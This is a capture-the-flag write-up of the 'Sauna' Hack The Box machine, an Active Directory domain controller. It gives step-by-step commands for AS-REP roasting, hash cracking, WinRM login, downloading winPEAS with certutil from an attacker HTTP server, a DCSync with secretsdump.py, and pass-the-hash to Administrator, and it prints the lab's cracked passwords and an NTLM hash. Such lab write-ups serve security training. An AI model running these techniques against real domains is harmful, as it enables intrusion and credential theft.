---
description: https://www.hackthebox.eu/home/machines/profile/229
---

# Sauna

![](<../../../.gitbook/assets/image (394) (1).png>)

## Scanning and Enumeration

### Nmap

```
sudo nmap 10.10.10.175 -p- -sS -sV -T4 -v
                                                                                                                                                                           
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-11-23 21:21:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
54801/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### SMB

I started off checking SMB and was not able to pull any interesting information using `smbmap` and `smbclient`.

![](<../../../.gitbook/assets/image (395).png>)

I then tried connecting with `rpcclient` and was able to successfully connect. Looks like however, we do not have permissions for anything noteworthy.

![](<../../../.gitbook/assets/image (396).png>)

### Port 80 (HTTP)

Since we have port 80 open on this server I start directory discovery with `dirb`.

```
dirb http://10.10.10.175/
```

When the scan results finished I did not find any interesting directories. Instead I opted to browse through the website manually.

Eventually I landed on the about page at [http://10.10.10.175/about.html](http://10.10.10.175/about.html). Which shows some employees.

![](<../../../.gitbook/assets/image (397).png>)

We can take a note of these for later. We can potentially use this when enumerating Kerberos. For now this is all the interesting information I can find on port 80.

### LDAP

Before moving onto Kerberos we can take a quick look at LDAP to see if we can pull anything here. We can use the following `nmap` command to attempt to enumerate LDAP\\

```
nmap -n -sV --script "ldap* and not brute" 10.10.10.175
```

From this we gain a surname and also the domain name of EGOTISTICAL-BANK.LOCAL which we can put in our hosts file.

![](<../../../.gitbook/assets/image (398) (1).png>)

### Port 88 (Kerberos)

On port 88 we have Kerberos. We have enough information to have a decent go at enumerating further information. What is interesting so far is that we have on the website a name of "Hugo Bear" and also the username "Hugo Smith" gathered from LDAP.

Firstly I will enter multiple variations of the name Hugo Smith as it is taken directly from LDAP. I will enter common Active Directory naming conventions and run this against Kerberos with Impacket's GetNPUsers.py script.

First I created a text file with possible AD account names.

* Hugo Smith
* Smith Hugo
* Smith H
* Hugo S
* SHugo
* HSmith
* H.Smith
* S.Hugo
* Hugo.Smith
* Hugo\_Smith
* Hugo-Smith

This was saved to a text file called "users.txt".

```
python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -format john -no-pass -usersfile /home/kali/Desktop/users.txt 
```

![](<../../../.gitbook/assets/image (399) (1).png>)

After attempting to [AS-REP Roasting](https://app.gitbook.com/@akimboviper/s/tools/impacket/as-rep-roasting) the username we find the HSmith is a valid name but did not have the "Do not use kerberos preauthentication" selected in Active Directory. Whilst we did not get the absolute best information we need from this we have discovered that the AD account naming convention is first letter of forename followed by surname.

Knowing this information we can populate our text file to include the following using the about page information on port 80.

I updated the users.txt file to include the following names:

* SKerb
* FSmith
* FBear
* SCoins
* BTaylor
* SDriver

Running the Impacket script again produces the following results:\\

![](<../../../.gitbook/assets/image (400).png>)

We have a hash for the account FSmith. Lets run the GETNPUsers.py script again however, this time we will define the `-outputfile` and `-format` switch to output the hash in a format compatible with `John` for cracking.

```
python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -format john -no-pass -usersfile /home/kali/Desktop/users.txt -outputfile /home/kali/Desktop/hash.txt
```

After this has been run we can load the hash into John.

![](<../../../.gitbook/assets/image (401).png>)

We now have the following credentials: `FSmith:Thestrokes23`

## Low Privilege Access

### Port 5985 (WinRM)

Port 5985 is open which is usually Windows Remote Management (WinRM). One of the best tools for Penetration testing on this service is Evil-WinRM which can be downloaded here:

{% embed url="https://github.com/Hackplayers/evil-winrm" %}

Once downloaded we can attempt to login with the credentials using the following command.

```
evil-winrm -u FSmith -p Thestrokes23 -i 10.10.10.175
```

![](<../../../.gitbook/assets/image (402).png>)

We now have access as a low privilege user. From her we can now move to the user desktop and grab the user.txt flag.

## Privilege Escalation

Now that we have access as user we need to set ourselves up for privilege escalation. Firstly I setup a `Python SimpleHttpServer` in my Windows scripts directory on the attacking machine.

```
sudo python -m SimpleHTTPServer 80
```

I then download winPEAS.exe as this is normally the first thing I do when enumerating a system to look for any quick and easy wins.

```
certutil.exe -f -urlcache -split http://10.10.14.11/winPEAS.exe
```

After this has been downloaded we can run it from Evil-WinRM with the following:

```
cmd.exe /c winPEAS.exe
```

Once it has completed one of the first results back is regarding AutoLogon credentials for the account `svc_loanmanager:Moneymakestheworldgoround!`

![](<../../../.gitbook/assets/image (404).png>)

I tried the credentials against Win-RM and `smbclient` and could not authenticate with them.

![](<../../../.gitbook/assets/image (405) (1).png>)

I could not get the credentials working anywhere so went back to enumerating and looked through `net user` again.

I realized the information given from the winPEAS output was incorrect. The actual user name for the account was 'svc\_loanmgr' not 'svc\_loanmanager'.

![](<../../../.gitbook/assets/image (406).png>)

Back to Evil-WinRM to try again...

![](<../../../.gitbook/assets/image (407).png>)

We now have access as the user 'svc\_loanmgr'. I once again looked around with this account and was unable to find a point of escalation. Time to break out Bloodhound to assist us.

First I downloaded SharpHound.exe to the server and then run it with `cmd.exe`. Once completed I then downloaded the results to my attacking machine.

![](<../../../.gitbook/assets/image (412).png>)

I queried the database by "Find principals with DCsync rights." which shows us the following:

![](<../../../.gitbook/assets/image (413).png>)

When checking the edge information we get the following:

_"The user SVC\_LOANMGR@EGOTISTICAL-BANK.LOCAL has the DS-Replication-Get-Changes privilege on the domain EGOTISTICAL-BANK.LOCAL._

_Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack."_

As we have both privileges of "GetChanges" and "GetChangesAll" We have potential to perform a DCsync attack and collect AD account hashses. We can test this with either `Mimikatz` or Impacket's secretsdump.py.

For this I will be using Impacket's secretsdump.py script. Move into the Impacket directory and run the following command:

```
sudo python secretsdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
```

{% hint style="info" %}
Ensure you are running the script elevated. Initially I did not and received inaccurate results which lead to me looking elsewhere for an hour before trying the script again with root permissions.
{% endhint %}

![](<../../../.gitbook/assets/image (408) (1).png>)

We have harvested the NTLM hash for the Administrator account. I attempted to crack this in `John` and was unsuccessful. We can however pass the hash to `Evil-WinRM` to login to the account instead of cracking the password.

```
evil-winrm -u administrator -p aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff -i 10.10.10.175
```

![](<../../../.gitbook/assets/image (409) (1).png>)

We have confirmed we are Administrator and are able to grab the root.txt flag.
